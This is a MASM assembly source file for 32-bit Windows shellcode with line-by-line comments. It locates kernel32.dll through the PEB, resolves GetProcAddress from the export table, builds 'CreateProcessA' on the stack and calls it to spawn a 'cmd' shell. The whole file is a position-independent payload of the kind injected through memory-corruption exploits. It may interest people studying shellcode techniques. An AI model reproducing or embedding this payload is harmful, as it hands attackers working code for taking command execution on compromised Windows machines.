.386
.model flat, stdcall
.stack 4096
assume fs:nothing

.code

start:
    xor ecx, ecx							; zero out ecx
	mul ecx									; eax * ecx
	mov eax, [fs:30h +ecx]					; PEB loaded in eax
	mov eax, [eax + 0ch]					; LDR loaded in eax
	mov esi, [eax + 14h]					; InMemoryOrderModuleList loaded in esi
	lodsd									; .exe address loaded in eax (1st)
	xchg esi, eax
	lodsd									; ntdll.dll address loaded in eax (2nd)
	mov ebx, [eax + 10h]					; kernel32.dll address loaded in ebx (3rd)

getAddressofName:
	mov edx, [ebx + 3ch]    				; PEheader offset in ebx
	add edx, ebx            				; PEheader offset + base address
	mov edx, [edx + 78h]   				    ; export directory offset in ebx
	add edx, ebx      					    ; export directory offset + base address
	mov esi, [edx + 20h]   				    ; AddressOfNames offset in ebx
	add esi, ebx            				; AddressOfNames offset + base address
	xor ecx, ecx            				; zero out ECX so we can use it as a counter

getProcAddress:
	lodsd                                   ; load AddressOfNames in eax
	inc ecx							        ; idx++
	add eax, ebx                            ; eax + base address
	cmp dword ptr [eax], 'PteG'             ; GetP
	jnz getProcAddress
	cmp dword ptr [eax + 4h], 'Acor'        ; rocA
	jnz getProcAddress
	cmp dword ptr [eax + 8h], 'erdd'        ; ddre
	jnz getProcAddress

getProcAddressAddr:
    ;; edx = GetProcAddress
	mov esi, [edx + 24h]                    ; AddressOfNameOrdinals offset
	add esi, ebx                            ; offset + base address
	mov cx, [esi + ecx * 2h]                ; array is made of 2-bytes idx
	dec ecx                                 ; idx-- to fix previous inc
	mov esi, [edx + 1ch]                    ; AddressOfFunctions offset
	add esi, ebx                            ; offset + base address
	mov edx, [esi + ecx * 4h]               ; array is made of 4 byte idx
	add edx, ebx                            ; offset + base address
    mov esi, edx                            ; save GetProcAddress in esi

getCreateProcessA:
	; GetProcAddress(kernel32,"CreateProcessA");
	xor ecx, ecx							; zero out ecx
	push 61614173h							; aAaa
	sub word ptr [esp + 2h], 6161h			; sAaa - aa
	push 7365636fh            				; oces
	push 72506574h            				; tePr
	push 61657243h            				; Crea
	push esp								; push ptrto string
	push ebx								; kernel32 base address
	call esi								; call GetProcAddress

getShell:
	push 617a6d63h							; cmza
	sub word ptr [esp + 2h], 6116h			; cmza - 0x6116
	mov ecx, esp
	push ecx                   				; lpProcessInformation
	push ecx								; lpStartupInfo
	xor edx,edx								; zero out edx
	push edx								; lpCurrentDirectory (NULL = same)
	push edx								; lpEnvironment
	push edx								; dwCreationFlags
	push edx								; bInheritHandles
	push edx								; lpThreadAttributes
	push edx								; lpProcessAttributes
	push ecx           						; 'cmd'
	push edx								; lpApplicationName
	call eax       							; spawn shell

end start
